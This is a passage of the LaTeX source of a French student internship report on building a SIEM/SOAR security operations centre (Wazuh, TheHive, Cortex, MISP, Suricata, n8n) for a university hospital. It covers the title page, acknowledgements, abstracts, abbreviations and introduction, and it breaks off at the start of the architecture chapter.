\documentclass[12pt,a4paper,twoside]{report}

% ===== PACKAGES =====
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
% Babel: 'francais' deprecated, switch to 'french'
\usepackage[french]{babel}
\usepackage{geometry}
\usepackage{fancyhdr}
\usepackage{graphicx}
\usepackage{float}
\usepackage{caption}
\usepackage{subcaption}
\usepackage{listings}
\usepackage{csquotes} % Recommended with biblatex & babel
% If using XeLaTeX/LuaLaTeX, inputenc is ignored; consider removing \usepackage{inputenc}
\usepackage[table]{xcolor}
\usepackage{url}
% tocloft should be loaded before hyperref for proper link handling
% (we move hyperref to the end of package list below)
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{array}
\usepackage{tabularx}
\usepackage{longtable}
\usepackage{multirow}
\usepackage{setspace}
\usepackage{titlesec}
\usepackage{tocloft}
\usepackage{appendix}
\usepackage[style=numeric,backend=bibtex]{biblatex}
% Load hyperref last
\usepackage{hyperref}
\usepackage{pifont}
\newcommand{\cmark}{\ding{51}} % check mark
\newcommand{\warning}{\ding{115}} % warning symbol alternative

% ===== CONFIGURATION DE PAGE =====
\geometry{
    left=3cm,
    right=2.5cm,
    top=2.5cm,
    bottom=2.5cm,
    headheight=15pt
}

% ===== STYLE DES EN-TÊTES ET PIEDS DE PAGE =====
\pagestyle{fancy}
\fancyhf{}
\fancyhead[LE]{\leftmark}
\fancyhead[RO]{\rightmark}
\fancyfoot[LE,RO]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0pt}

% ===== CONFIGURATION DES TITRES =====
	\titleformat{\chapter}[hang]
{\normalfont\LARGE\bfseries}{\thechapter}{1em}{}
	\titlespacing*{\chapter}{0pt}{-30pt}{20pt}
% Harmoniser et réduire l'espace vertical surtout avant les subsubsections
	\titleformat{\section}[hang]{\normalfont\Large\bfseries}{\thesection}{1em}{}
	\titlespacing*{\section}{0pt}{2.5ex plus 1ex minus .2ex}{1.5ex plus .2ex}
	\titleformat{\subsection}[hang]{\normalfont\large\bfseries}{\thesubsection}{1em}{}
	\titlespacing*{\subsection}{0pt}{2.25ex plus 1ex minus .2ex}{1ex plus .2ex}
	\titleformat{\subsubsection}[hang]{\normalfont\normalsize\bfseries}{\thesubsubsection}{1em}{}
% Avant (before skip) réduit pour éviter grand espace constaté, après (after skip) compact
	\titlespacing*{\subsubsection}{0pt}{1.2ex plus .5ex minus .2ex}{0.7ex plus .2ex}

% ===== ESPACEMENT =====
\onehalfspacing
\setlength{\parindent}{1.5em}
\setlength{\parskip}{0.5em}

% ===== CONFIGURATION DES LISTINGS AVANCÉE =====
% Custom language definitions (simplified) for JSON, JavaScript, YAML
\lstdefinelanguage{json}{
    basicstyle=\ttfamily\small,
    comment=[l]{//},
    morestring=[b]",% strings
    stringstyle=\color{orange!70!black},
    showstringspaces=false
}
\lstdefinelanguage{JavaScript}{
    keywords={function,var,let,const,if,for,while,return,else,try,catch,new,JSON,parse,stringify,setInterval},
    sensitive=true,
    comment=[l]{//},
    morecomment=[s]{/*}{*/},
    morestring=[b]",
    morestring=[b]',
}
% YAML language definition (safe version)
\lstdefinelanguage{yaml}{
    comment=[l]{\#},
    morestring=[b]",
    morestring=[b]',
    keywords={true,false,null,yes,no},
    sensitive=false
}
\lstset{
    backgroundcolor=\color{gray!10},
    basicstyle=\footnotesize\ttfamily,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    commentstyle=\color{green!40!black}\slshape,
    deletekeywords={...},
    % (Removed escapeinside and extendedchars to prevent macro parsing issues)
    frame=leftline,
    framerule=4pt,
    keepspaces=true,
    keywordstyle=\color{blue}\bfseries,
    language=bash,
    morekeywords={*,...},
    numbers=left,
    numbersep=8pt,
    numberstyle=\tiny\color{gray},
    rulecolor=\color{blue!80!black},
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    stepnumber=1,
    stringstyle=\color{orange},
    tabsize=2,
    title=\lstname,
    xleftmargin=15pt,
    framexleftmargin=15pt
}

% Styles spécialisés pour différents langages
\lstdefinestyle{xmlstyle}{
    language=XML,
    backgroundcolor=\color{blue!10},
    keywordstyle=\color{purple}\bfseries,
    commentstyle=\color{green!50!black}\slshape,
    stringstyle=\color{red!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{purple!80!black}
}

\lstdefinestyle{pythonstyle}{
    language=Python,
    backgroundcolor=\color{blue!5},
    keywordstyle=\color{blue}\bfseries,
    commentstyle=\color{green!50!black}\slshape,
    stringstyle=\color{red!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{blue!80!black}
}

\lstdefinestyle{bashstyle}{
    language=bash,
    backgroundcolor=\color{black!5},
    keywordstyle=\color{green!50!black}\bfseries,
    commentstyle=\color{gray}\slshape,
    stringstyle=\color{red!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{green!80!black}
}

\lstdefinestyle{jsonstyle}{
    language=json,
    backgroundcolor=\color{orange!5},
    keywordstyle=\color{orange}\bfseries,
    commentstyle=\color{green!50!black}\slshape,
    stringstyle=\color{blue!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{orange!80!black}
}

\lstdefinestyle{jsstyle}{
    language=JavaScript,
    backgroundcolor=\color{yellow!10},
    keywordstyle=\color{purple}\bfseries,
    commentstyle=\color{green!50!black}\slshape,
    stringstyle=\color{red!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{purple!80!black}
}

\lstdefinestyle{yamlstyle}{
    language=yaml,
    backgroundcolor=\color{gray!5},
    keywordstyle=\color{blue!70!black}\bfseries,
    commentstyle=\color{green!50!black}\slshape,
    stringstyle=\color{orange!70!black},
    frame=leftline,
    framerule=3pt,
    rulecolor=\color{blue!40!black}
}

% ===== COULEURS PERSONNALISÉES =====
\definecolor{soarblue}{RGB}{51,102,153}
\definecolor{soargreen}{RGB}{102,153,51}
\definecolor{soarred}{RGB}{153,51,51}
\definecolor{greenOil}{RGB}{197,219,151}

% ===== HYPERLIENS =====
\hypersetup{
    colorlinks=true,
    linkcolor=soarblue,
    urlcolor=soarblue,
    citecolor=soargreen,
    pdfauthor={Med10S},
    pdftitle={Rapport de Stage PFA - Système SIEM/SOAR pour SOC Hospitalier},
    pdfsubject={Cybersécurité - SOC - SIEM/SOAR},
    pdfkeywords={SIEM, SOAR, Cybersécurité, Hôpital, SOC, TheHive, Wazuh}
}

% ===== BIBLIOGRAPHIE =====
\addbibresource{bibliography.bib}

% ===== INFORMATIONS DU DOCUMENT =====
\title{%
    \textbf{Conception et Implémentation d'un Système SIEM/SOAR} \\
    \vspace{0.5cm}
    \large{pour Centre d'Opérations de Sécurité Hospitalière} \\
    \vspace{1cm}
    \normalsize{Rapport de Projet de Fin d'Année (PFA)}
}

\author{%
    \textbf{Med10S} \\
    \vspace{0.3cm}
    \small{Étudiant en Génie des Télécommunications et Réseaux (GTR)} \\
    \small{Semestre 4 - Année Universitaire 2024-2025}
}

\date{Juillet 2025}

% ===== DÉBUT DU DOCUMENT =====
\begin{document}

% ===== PAGE DE TITRE =====
\begin{titlepage}
    \newgeometry{top=1cm, left=0cm, right=0cm, bottom=0cm}
    \centering

    % Banner universitaire en haut au centre
    \begin{minipage}{\textwidth}
        \centering

        % Image du banner universitaire
        \includegraphics[]{images/USMBA_banner.jpg}


        % Ligne de séparation
    \end{minipage}

    \vspace{4cm}    % Titre principal
    {\Huge\bfseries Stage d’Application\par}
    \vspace{0.5cm}
    {\large\bfseries Élève Ingénieur en 2ème année\par}
    \vspace{0.3cm}
    {\large Génie Télécommunications et réseaux\par}
    {\large Stage réalisé au sein du Centre Hospitalière Universitaire de Fes (CHU Fes)\par}

    \vspace{1.5cm}

    % Titre du projet dans un encadré vert
    \fcolorbox{black}{greenOil!30}{%
        \begin{minipage}{0.8\textwidth}
            \centering
            \vspace{0.3cm}
            {\Large\bfseries Conception et Implémentation d'une Solution SIEM/SOAR pour Centre d'Opérations de Sécurité Hospitalière}
            \vspace{0.3cm}
        \end{minipage}
    }



    % Année universitaire
    \vfill
    {\large Période de stage 1/07/2024 au 31/8/2024\par}
    % Section verte avec les informations des personnes
    \fcolorbox{black}{greenOil!40}{%
        \begin{minipage}{\textwidth}
            \vspace{0.3cm}
            \raggedright
            \hspace{3.5cm}\textbf{Réalisé par :} \textbf{M. SBIHI MOHAMMED}\\
            \vspace{2cm}
            \hspace{3.5cm}\textbf{Encadrant ENSAF} \textbf{--------}\\
            \vspace{0.2cm}
            \hspace{3.5cm}\textbf{Encadrant Société } \textbf{--------}\\
            \vspace{1cm}
            \hspace{3.5cm}\textbf{Membres de jury :}\\
            \hspace{4cm}\textbf{Pr. --------}\\
            \hspace{4cm}\textbf{Pr. --------}\\
            \vspace{2cm}
        \end{minipage}
    }


    % Bannière inférieure avec logos


\end{titlepage}
\restoregeometry

% ===== NUMÉROTATION ARABE POUR TOUT LE DOCUMENT =====
\pagenumbering{arabic}
\setcounter{page}{1}

% ===== REMERCIEMENTS =====
\chapter*{Remerciements}
\addcontentsline{toc}{chapter}{Remerciements}

\vspace{1cm}

Je tiens a exprimer ma profonde gratitude a tous ceux qui ont contribue a la reussite de ce projet de fin d'annee et a l'elaboration de ce rapport.

\vspace{0.5cm}

\textbf{Avant tout, je remercie Dieu le Tout-Puissant} de m'avoir donne la force, la sante et la volonte necessaires pour mener a bien ce projet. Sa benediction m'a accompagne tout au long de ce parcours.

\vspace{0.5cm}

\textbf{A mon encadrant au CHU,} pour son accueil chaleureux au sein de l'etablissement hospitalier, sa confiance accordee pour mener ce projet sensible de cybersecurite, et ses precieux conseils sur les enjeux pratiques de la securite informatique en milieu medical. Son expertise du terrain hospitalier a ete inestimable pour adapter notre solution aux contraintes operationnelles reelles.

\vspace{0.5cm}

\textbf{A mon encadrant academique,} pour ses conseils eclaires, son suivi rigoureux et sa disponibilite tout au long de ce projet. Ses orientations methodologiques ont ete determinantes dans l'aboutissement de cette realisation.

\vspace{0.5cm}

\textbf{A l'equipe pedagogique} du departement Genie des Telecommunications et Reseaux (GTR), pour la qualite de la formation dispensee qui m'a permis d'acquerir les competences techniques necessaires a la conception et a l'implementation de cette solution de cybersecurite.

\vspace{0.5cm}

\textbf{A la communaute open source} et aux developpeurs des projets Wazuh, TheHive, Cortex, MISP, Suricata et ModSecurity, dont les outils exceptionnels ont rendu possible la creation de cette architecture SOAR complete.

\vspace{0.5cm}

\textbf{Aux professionnels de la cybersecurite} et aux chercheurs en securite des systemes d'information hospitaliers, dont les publications et retours d'experience ont enrichi ma comprehension des enjeux securitaires specifiques au domaine medical.

\vspace{0.5cm}

\textbf{A mes collegues etudiants,} pour les echanges constructifs et l'entraide mutuelle qui ont contribue a l'avancement de nos projets respectifs.

\vspace{0.5cm}

\textbf{A ma famille,} pour son soutien indefectible et sa patience durant les nombreuses heures consacrees a ce projet.

\vspace{1cm}

Ce projet n'aurait pu voir le jour sans cette convergence de competences, de conseils et d'encouragements. Il temoigne de l'importance de la collaboration dans le domaine de la cybersecurite, ou la mutualisation des connaissances est essentielle pour faire face aux defis securitaires contemporains.

\vspace{1cm}


\newpage


% ===== RÉSUMÉ =====
\chapter*{Resume}
\addcontentsline{toc}{chapter}{Resume}

\vspace{1cm}

\textbf{Contexte et Problematique}

Les etablissements hospitaliers font face a des defis cybersecuritaires croissants dans un contexte de digitalisation acceleree de leurs systemes d'information. Les equipements medicaux connectes, les dossiers patients electroniques et les systemes critiques de gestion hospitaliere constituent des cibles privilegiees pour les cyberattaquants. La continuite de service etant vitale dans l'environnement medical, il est imperatif de disposer d'une capacite de detection et de reponse aux incidents de securite a la fois rapide et fiable.

\vspace{0.5cm}

\textbf{Objectifs du Projet}

Ce projet de fin d'annee vise a concevoir et implementer une solution complete de Centre d'Operations de Securite (SOC) adaptee aux specificites hospitalieres. L'objectif principal est de creer une architecture SIEM/SOAR (Security Information and Event Management / Security Orchestration, Automation and Response) capable de detecter proactivement les cybermenaces et d'automatiser les reponses d'incidents.

\vspace{0.5cm}

\textbf{Methodologie et Architecture}

L'architecture proposee s'articule autour de quatre couches fonctionnelles interconnectees :

\begin{itemize}
    \item \textbf{Couche de Detection} : Integration de Suricata (IDS/IPS reseau), Wazuh (SIEM central), pfSense (pare-feu) et ModSecurity (WAF) pour une couverture de securite multi-niveaux
    \item \textbf{Couche d'Analyse} : Deploiement de TheHive (gestion d'incidents), Cortex (analyses automatisees) et MISP (threat intelligence)
    \item \textbf{Couche d'Orchestration} : Utilisation de n8n pour l'automatisation des workflows de reponse aux incidents
    \item \textbf{Couche de Presentation} : Interfaces unifiees de monitoring et dashboards de pilotage
\end{itemize}

\vspace{0.5cm}
\clearpage

\textbf{Realisations et Tests}

L'implementation a ete validee par des tests d'intrusion controles portant sur trois categories d'attaques : l'exploitation EternalBlue (CVE-2017-0144), les attaques XSS (Cross-Site Scripting) et l'acces a des sites malveillants. Les resultats demontrent un taux de detection global de 90,9\% avec un temps de reponse moyen de 4,7 secondes.

\vspace{0.5cm}

\textbf{Contributions et Apports}

Cette solution apporte plusieurs innovations significatives :
\begin{itemize}
    \item Automatisation de 59,4\% des incidents de securite grace aux playbooks SOAR
    \item Reduction de 70\% du temps de reponse compare aux approches manuelles
    \item Architecture evolutive compatible avec les infrastructures existantes
\end{itemize}

\vspace{0.5cm}

\textbf{Perspectives}

Les extensions futures incluent l'integration d'algorithmes d'apprentissage automatique pour la detection comportementale, l'amelioration de la detection des menaces avancees persistantes (APT) et l'extension de la solution a d'autres secteurs critiques.

\vspace{1cm}

\textbf{Mots-cles :} SIEM, SOAR, Cybersecurite hospitaliere, SOC, Detection d'intrusion, Automatisation de la reponse, TheHive, Wazuh, Threat Intelligence

\newpage


% ===== ABSTRACT =====
\chapter*{Abstract}
\addcontentsline{toc}{chapter}{Abstract}

\vspace{1cm}

\textbf{Context and Problem Statement}

Healthcare institutions face increasing cybersecurity challenges in the context of accelerated digitization of their information systems. Connected medical devices, electronic patient records, and critical hospital management systems constitute privileged targets for cyberattackers. Since service continuity is vital in the medical environment, it is imperative to have incident detection and response capabilities that are both fast and reliable.

\vspace{0.5cm}

\textbf{Project Objectives}

This final year project aims to design and implement a comprehensive Security Operations Center (SOC) solution adapted to hospital specificities. The main objective is to create a SIEM/SOAR (Security Information and Event Management / Security Orchestration, Automation and Response) architecture capable of proactively detecting cyber threats and automating incident responses.
\vspace{0.5cm}

\textbf{Methodology and Architecture}

The proposed architecture is structured around four interconnected functional layers:

\begin{itemize}
    \item \textbf{Detection Layer}: Integration of Suricata (network IDS/IPS), Wazuh (central SIEM), pfSense (firewall), and ModSecurity (WAF) for multi-level security coverage
    \item \textbf{Analysis Layer}: Deployment of TheHive (incident management), Cortex (automated analysis), and MISP (threat intelligence)
    \item \textbf{Orchestration Layer}: Use of n8n for incident response workflow automation
    \item \textbf{Presentation Layer}: Unified monitoring interfaces and management dashboards
\end{itemize}

\vspace{0.5cm}

\textbf{Implementation and Testing}

The implementation was validated through controlled penetration tests covering three attack categories: EternalBlue exploitation (CVE-2017-0144), XSS (Cross-Site Scripting) attacks, and malicious website access. Results demonstrate an overall detection rate of 90.9\% with an average response time of 4.7 seconds.

\vspace{0.5cm}
\clearpage

\textbf{Contributions and Benefits}

This solution brings several significant innovations:
\begin{itemize}
    \item Automation of 59.4\% of security incidents through SOAR playbooks
    \item 70\% reduction in response time compared to manual approaches
    \item Scalable architecture compatible with existing infrastructures
\end{itemize}

\vspace{0.5cm}

\textbf{Future Perspectives}

Future extensions include the integration of machine learning algorithms for behavioral detection, improvement of advanced persistent threat (APT) detection, and extension of the solution to other critical sectors.

\vspace{1cm}

\textbf{Keywords:} SIEM, SOAR, Hospital cybersecurity, SOC, Intrusion detection, Response automation, TheHive, Wazuh, Threat Intelligence

\newpage


% ===== LISTE DES ABRÉVIATIONS =====
\chapter*{Liste des Abreviations}
\addcontentsline{toc}{chapter}{Liste des Abreviations}

\vspace{1cm}

\begin{longtable}{p{3cm} p{12cm}}

    \textbf{API}     & Application Programming Interface - Interface de programmation d'application                           \\[0.3cm]

    \textbf{APT}     & Advanced Persistent Threat - Menace persistante avancee                                                \\[0.3cm]

    \textbf{C2}      & Command and Control - Commande et controle                                                             \\[0.3cm]

    \textbf{CORS}    & Cross-Origin Resource Sharing - Partage de ressources entre origines                                   \\[0.3cm]

    \textbf{CRS}     & Core Rule Set - Ensemble de regles de base (OWASP)                                                     \\[0.3cm]

    \textbf{CSRF}    & Cross-Site Request Forgery - Falsification de requete inter-sites                                      \\[0.3cm]

    \textbf{CVE}     & Common Vulnerabilities and Exposures - Vulnerabilites et expositions communes                          \\[0.3cm]

    \textbf{DGA}     & Domain Generation Algorithm - Algorithme de generation de domaines                                     \\[0.3cm]

    \textbf{DNS}     & Domain Name System - Systeme de noms de domaine                                                        \\[0.3cm]

    \textbf{DPI}     & Deep Packet Inspection - Inspection approfondie de paquets                                             \\[0.3cm]

    \textbf{EHR}     & Electronic Health Record - Dossier de sante electronique                                               \\[0.3cm]

    \textbf{GDPR}    & General Data Protection Regulation - Reglement general sur la protection des donnees                   \\[0.3cm]

    \textbf{GTR}     & Genie des Telecommunications et Reseaux                                                                \\[0.3cm]

    \textbf{HIDS}    & Host-based Intrusion Detection System - Systeme de detection d'intrusion base sur l'hote               \\[0.3cm]

    \textbf{HIPAA}   & Health Insurance Portability and Accountability Act                                                    \\[0.3cm]

    \textbf{HTTP}    & HyperText Transfer Protocol - Protocole de transfert hypertexte                                        \\[0.3cm]

    \textbf{HTTPS}   & HTTP Secure - HTTP securise                                                                            \\[0.3cm]

    \textbf{IDS}     & Intrusion Detection System - Systeme de detection d'intrusion                                          \\[0.3cm]

    \textbf{IoC}     & Indicator of Compromise - Indicateur de compromission                                                  \\[0.3cm]

    \textbf{IoT}     & Internet of Things - Internet des objets                                                               \\[0.3cm]

    \textbf{IP}      & Internet Protocol - Protocole Internet                                                                 \\[0.3cm]

    \textbf{IPS}     & Intrusion Prevention System - Systeme de prevention d'intrusion                                        \\[0.3cm]

    \textbf{JSON}    & JavaScript Object Notation - Notation d'objet JavaScript                                               \\[0.3cm]

    \textbf{KPI}     & Key Performance Indicator - Indicateur cle de performance                                              \\[0.3cm]

    \textbf{LDAP}    & Lightweight Directory Access Protocol - Protocole d'acces a l'annuaire leger                           \\[0.3cm]

    \textbf{MISP}    & Malware Information Sharing Platform - Plateforme de partage d'informations sur les malwares           \\[0.3cm]

    \textbf{MTTR}    & Mean Time To Response - Temps moyen de reponse                                                         \\[0.3cm]

    \textbf{NIST}    & National Institute of Standards and Technology                                                         \\[0.3cm]

    \textbf{OWASP}   & Open Web Application Security Project                                                                  \\[0.3cm]

    \textbf{PACS}    & Picture Archiving and Communication System - Systeme d'archivage et de communication d'images          \\[0.3cm]

    \textbf{PAP}     & Traffic Light Protocol for Permissible Actions                                                         \\[0.3cm]

    \textbf{PCAP}    & Packet Capture - Capture de paquets                                                                    \\[0.3cm]

    \textbf{PCI-DSS} & Payment Card Industry Data Security Standard                                                           \\[0.3cm]

    \textbf{PFA}     & Projet de Fin d'Annee                                                                                  \\[0.3cm]

    \textbf{PKI}     & Public Key Infrastructure - Infrastructure a cles publiques                                            \\[0.3cm]

    \textbf{RBAC}    & Role-Based Access Control - Controle d'acces base sur les roles                                        \\[0.3cm]

    \textbf{RCE}     & Remote Code Execution - Execution de code a distance                                                   \\[0.3cm]

    \textbf{REST}    & Representational State Transfer                                                                        \\[0.3cm]

    \textbf{RGPD}    & Reglement General sur la Protection des Donnees                                                        \\[0.3cm]

    \textbf{RSSI}    & Responsable de la Securite des Systemes d'Information                                                  \\[0.3cm]

    \textbf{SIEM}    & Security Information and Event Management - Gestion des informations et evenements de securite         \\[0.3cm]

    \textbf{SLA}     & Service Level Agreement - Accord de niveau de service                                                  \\[0.3cm]

    \textbf{SMB}     & Server Message Block - Protocole de partage de fichiers                                                \\[0.3cm]

    \textbf{SMTP}    & Simple Mail Transfer Protocol - Protocole simple de transfert de courrier                              \\[0.3cm]

    \textbf{SOC}     & Security Operations Center - Centre d'operations de securite                                           \\[0.3cm]

    \textbf{SOAR}    & Security Orchestration, Automation and Response - Orchestration, automatisation et reponse de securite \\[0.3cm]

    \textbf{SQL}     & Structured Query Language - Langage de requete structure                                               \\[0.3cm]

    \textbf{SSH}     & Secure Shell - Shell securise                                                                          \\[0.3cm]

    \textbf{SSL}     & Secure Sockets Layer - Couche de sockets securisee                                                     \\[0.3cm]

    \textbf{TCP}     & Transmission Control Protocol - Protocole de controle de transmission                                  \\[0.3cm]

    \textbf{TLP}     & Traffic Light Protocol - Protocole de feu de circulation                                               \\[0.3cm]

    \textbf{TLS}     & Transport Layer Security - Securite de la couche de transport                                          \\[0.3cm]

    \textbf{TTL}     & Time To Live - Duree de vie                                                                            \\[0.3cm]

    \textbf{UDP}     & User Datagram Protocol - Protocole de datagramme utilisateur                                           \\[0.3cm]

    \textbf{URL}     & Uniform Resource Locator - Localisateur uniforme de ressource                                          \\[0.3cm]

    \textbf{VM}      & Virtual Machine - Machine virtuelle                                                                    \\[0.3cm]

    \textbf{WAF}     & Web Application Firewall - Pare-feu d'application web                                                  \\[0.3cm]

    \textbf{XML}     & eXtensible Markup Language - Langage de balisage extensible                                            \\[0.3cm]

    \textbf{XSS}     & Cross-Site Scripting - Script inter-sites                                                              \\[0.3cm]

    \textbf{YAML}    & YAML Ain't Markup Language - YAML n'est pas un langage de balisage                                     \\[0.3cm]
\end{longtable}

\newpage


% ===== TABLE DES MATIÈRES =====
\clearpage
\setcounter{tocdepth}{2} % include subsections/subsubsections if needed
\setcounter{secnumdepth}{3}
\phantomsection
\tableofcontents
\clearpage

% ===== LISTE DES FIGURES =====
\phantomsection
\listoffigures
\clearpage

% ===== LISTE DES TABLEAUX =====
\phantomsection
\listoftables
\clearpage

\chapter{Introduction Générale}

\section{Contexte et Enjeux de la Cybersécurité Hospitalière}

La transformation numérique du secteur de la santé a considérablement modifié le paysage des menaces cybernétiques auxquelles font face les établissements hospitaliers. Cette évolution, accélérée par la pandémie de COVID-19, a multiplié les surfaces d'attaque et les vulnérabilités potentielles dans des environnements où la continuité de service peut directement impacter la vie humaine.

\subsection{Particularités de l'Environnement Hospitalier}

Les établissements de santé présentent des caractéristiques uniques qui complexifient leur sécurisation :

\begin{itemize}
    \item \textbf{Criticité temporelle} : Les systèmes médicaux ne peuvent tolérer d'interruptions prolongées sans risquer la sécurité des patients
    \item \textbf{Hétérogénéité technologique} : Coexistence d'équipements médicaux spécialisés, de systèmes d'information hospitaliers (SIH) et d'infrastructures IT traditionnelles
    \item \textbf{Sensibilité des données} : Manipulation de données de santé à caractère hautement personnel et confidentiel
\end{itemize}

\subsection{Évolution des Menaces Cybernétiques en Santé}

Les statistiques récentes révèlent une augmentation alarmante des cyberattaques ciblant le secteur de la santé. Selon l'Agence de la cybersécurité et de la sécurité des infrastructures (CISA), les attaques par ransomware contre les établissements de santé ont augmenté de 123\% entre 2021 et 2024. Cette escalation s'explique par plusieurs facteurs :

\begin{enumerate}
    \item \textbf{Valeur économique des données de santé} : Les dossiers médicaux se négocient jusqu'à 250\$ sur le dark web, soit 50 fois plus qu'un numéro de carte bancaire
    \item \textbf{Vulnérabilités systémiques} : Présence d'équipements médicaux connectés souvent obsolètes et difficilement patchables
    \item \textbf{Pression temporelle} : La criticité des services de santé incite au paiement rapide des rançons
    \item \textbf{Complexité infrastructurelle} : Segmentation réseau insuffisante et visibilité limitée sur les actifs connectés
\end{enumerate}

\section{Problématique et Motivation}

\subsection{Défis de la Détection d'Incidents en Environnement Hospitalier}

La détection efficace des incidents de sécurité dans un contexte hospitalier présente plusieurs défis spécifiques :

\subsubsection{Latence de Détection}

Les méthodes traditionnelles de surveillance sécuritaire présentent des délais de détection incompatibles avec les exigences hospitalières. Une étude de l'IBM Security révèle que le temps moyen de détection d'une intrusion dans le secteur de la santé s'établit à 329 jours, permettant aux attaquants de maintenir une persistance prolongée dans les systèmes.

\subsubsection{Volume et Diversité des Événements}

Un établissement hospitalier de taille moyenne génère quotidiennement plusieurs millions d'événements de sécurité. Cette volumétrie, combinée à la diversité des sources (équipements médicaux, systèmes administratifs, infrastructures réseau), complique l'identification des signaux faibles annonciateurs d'attaques sophistiquées.

\subsubsection{Faux Positifs et Fatigue Opérationnelle}

Les systèmes de détection traditionnels génèrent un taux élevé de fausses alertes, conduisant à une fatigue opérationnelle des équipes de sécurité. Cette situation peut masquer de véritables incidents de sécurité dans le bruit de fond des alertes non pertinentes.

\subsection{Limites des Approches Actuelles}

\subsubsection{Solutions Ponctuelles et Cloisonnées}

La plupart des établissements hospitaliers déploient des solutions de sécurité hétérogènes et non intégrées, créant des silos informationnels qui limitent la capacité de corrélation et d'analyse globale des incidents.

\subsubsection{Absence d'Automatisation}

L'absence de processus automatisés de réponse aux incidents contraint les équipes de sécurité à des interventions manuelles chronophages, retardant la containment des menaces et augmentant l'exposition aux risques.

\subsubsection{Manque de Contexte et d'Intelligence}

Les systèmes existants peinent à enrichir les alertes avec le contexte métier nécessaire à une prise de décision éclairée, notamment concernant l'impact potentiel sur les soins aux patients.

\section{Objectifs du Projet}

\subsection{Objectif Principal}

Ce projet vise à concevoir et implémenter une solution intégrée de Centre d'Opérations de Sécurité (SOC) spécialement adaptée aux contraintes et exigences du secteur hospitalier. Cette solution s'articule autour d'une architecture SIEM/SOAR (Security Information and Event Management / Security Orchestration, Automation and Response) permettant une détection proactive, une analyse intelligente et une réponse automatisée aux incidents de cybersécurité.

\subsection{Objectifs Spécifiques}

\subsubsection{Amélioration de la Détection}

\begin{itemize}
    \item Réduire le temps de détection des incidents de 329 jours à moins de 5 minutes
    \item Atteindre un taux de détection supérieur à 90\% pour les attaques connues
    \item Minimiser le taux de faux positifs en dessous de 5\%
    \item Implémenter une détection multi-couches couvrant le réseau, les endpoints et les applications web
\end{itemize}

\subsubsection{Automatisation de la Réponse}

\begin{itemize}
    \item Automatiser 60\% des réponses aux incidents de niveau faible à moyen
    \item Réduire le temps de réponse initial de plusieurs heures à moins de 30 secondes
    \item Implémenter des playbooks de réponse adaptés aux spécificités hospitalières
    \item Assurer la traçabilité complète des actions automatisées pour la conformité réglementaire
\end{itemize}

\subsubsection{Intégration et Corrélation}

\begin{itemize}
    \item Centraliser la collecte d'événements de sécurité provenant de l'ensemble de l'infrastructure
    \item Implémenter des mécanismes de corrélation avancés pour identifier les attaques multi-étapes
    \item Enrichir les alertes avec de l'intelligence sur les menaces (threat intelligence)
    \item Fournir une vue unifiée de la posture sécuritaire de l'établissement
\end{itemize}



\section{Approche Méthodologique}

\subsection{Analyse des Besoins}

La phase d'analyse s'appuie sur l'étude de la littérature scientifique, l'analyse des retours d'expérience du secteur et l'identification des meilleures pratiques en matière de cybersécurité. Cette analyse permet de définir les exigences fonctionnelles et non-fonctionnelles de la solution.

\subsection{Conception Architecturale}

L'architecture proposée suit une approche en couches permettant :
\begin{itemize}
    \item La séparation des préoccupations entre détection, analyse et réponse
    \item L'évolutivité et la maintenabilité de la solution
    \item L'intégration avec les infrastructures existantes
    \item La résilience et la haute disponibilité
\end{itemize}

\subsection{Prototypage et Validation}

Le développement suit une approche itérative avec :
\begin{itemize}
    \item Implémentation d'un prototype fonctionnel
    \item Tests d'intrusion contrôlés pour valider l'efficacité de la détection
    \item Évaluation des performances et de la scalabilité
    \item Mesure des métriques de sécurité (temps de détection, taux de faux positifs, etc.)
\end{itemize}

\section{Contributions Attendues}

\subsection{Contributions Scientifiques}

\begin{itemize}
    \item Proposition d'une architecture SOAR adaptée aux spécificités hospitalières
    \item Développement de mécanismes de corrélation d'événements optimisés pour l'environnement médical
    \item Création de playbooks de réponse automatisée respectant les contraintes de continuité de service
\end{itemize}

\subsection{Contributions Techniques}

\begin{itemize}
    \item Implémentation d'une solution open source complète et documentée
\end{itemize}

\subsection{Contributions Pratiques}

\begin{itemize}
    \item Réduction significative des coûts de cybersécurité par l'automatisation
    \item Amélioration de la posture sécuritaire des établissements
    \item Facilitation de la conformité réglementaire
\end{itemize}

\section{Organisation du Rapport}

Ce rapport s'organise autour de la structure logique du projet, chaque chapitre correspondant à une phase de développement ou à un composant majeur de l'architecture :

\begin{itemize}
    \item \textbf{Chapitre 1 - Contexte et Problématique} : Analyse de l'environnement hospitalier, des menaces spécifiques et de l'état de l'art des solutions SIEM/SOAR
    \item \textbf{Chapitre 2 - Méthodologie et Approche Technique} : Présentation de la méthodologie de développement, du framework de sécurité et de l'architecture technique détaillée
    \item \textbf{Chapitre 3 - Implémentation et Configuration} : Déploiement de l'infrastructure, configuration des composants et intégration de la stack SIEM/SOAR
    \item \textbf{Chapitre 4 - Tests et Validation} : Scénarios d'attaque contrôlés (EternalBlue, XSS, sites malveillants), méthodologie Red Team/Blue Team et évaluation des performances
\end{itemize}

Chaque chapitre présente les aspects théoriques, l'implémentation pratique et les résultats obtenus, offrant une vision complète du projet depuis l'analyse du contexte jusqu'à la validation opérationnelle de la solution SIEM/SOAR.

\newpage


% ===== STRUCTURE DU PROJET =====
\chapter{Structure du Projet et Présentation des Composants}

Ce chapitre présente l'organisation structurelle du projet et introduit chacun des composants majeurs de l'architecture SIEM/SOAR développée. Cette présentation suit la logique fonctionnelle de la solution, depuis les fondements architecturaux jusqu'aux tests de validation.

\section{Chapitre 1 - Architecture Système}

\subsection{Vue d'Ensemble Architecturale}

Le premier chapitre établit les fondements conceptuels et techniques de la solution. Il présente une architecture en quatre couches interconnectées, chacune ayant une responsabilité spécifique dans la chaîne de traitement des événements de sécurité.

\subsubsection{Couche de Données (Layer 0)}
